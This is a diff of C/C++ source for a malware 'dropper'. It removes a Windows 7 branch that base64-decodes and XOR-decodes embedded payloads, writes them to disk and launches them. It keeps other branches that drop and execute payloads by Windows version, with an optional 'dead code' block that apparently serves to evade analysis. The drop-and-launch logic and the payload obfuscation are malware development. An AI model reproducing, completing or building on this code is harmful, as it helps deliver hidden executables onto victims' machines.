@@ -130,43 +130,7 @@ int main(int argc, char* argv[])
 		return 0;
 	}
 
-
-/////////////////////////////////////////////////////
-
-	 //Windows 7 extract version of Dropper
-
-/////////////////////////////////////////////////////
-
 	else if (os_version == 6) {
-#ifdef W7_EXTRACT
-
-		dropper_start(2);
-		dropper_start(3);
-
-	#if DROPPER_BASE64 == 1
-		data2 = base64decode(data2, &size2);
-		data3 = base64decode(data3, &size3);
-	#endif
-
-	#if DROPPER_XOR_KEY != 0
-		data2 = XOR(data2, size2);
-		data3 = XOR(data3, size3);
-	#endif
-
-		drop(size2, data2, name2);
-		size3 = size3 - 1;
-		drop(size3, data3, name3);
-
-		bool result = non_exe_launch(name3);
-
-
-		std::cout << "before launch";
-		if (result == true){
-			exe_launch(name2);
-			std::cout << "after launch";
-		} else {
-			std::cout << "This failed and nothing happened.\n";
-		}
 
 ////////////////////////////////////////////
 
@@ -174,7 +138,6 @@ int main(int argc, char* argv[])
 
 ////////////////////////////////////////////
 
-#else
 		dropper_start(1);
 		dropper_start(2);
 
@@ -192,14 +155,14 @@ int main(int argc, char* argv[])
 		drop(size2, data2, name2);
 
 		exe_launch(name1);
+		printf("[%d]", GetLastError());
 
-#endif
 
 #ifdef DEAD_CODE
 		// dead code
 		dead();
-#endif
 	// exit without waiting child process
+#endif
 
 	}
 
@@ -238,10 +201,10 @@ int main(int argc, char* argv[])
 //		exe_launch(name1);
 		exe_launch(name4);
 
-#ifdef DEAD_CODE
+	#ifdef DEAD_CODE
 		// dead code
 		dead();
-#endif
+	#endif
 
 	}
 
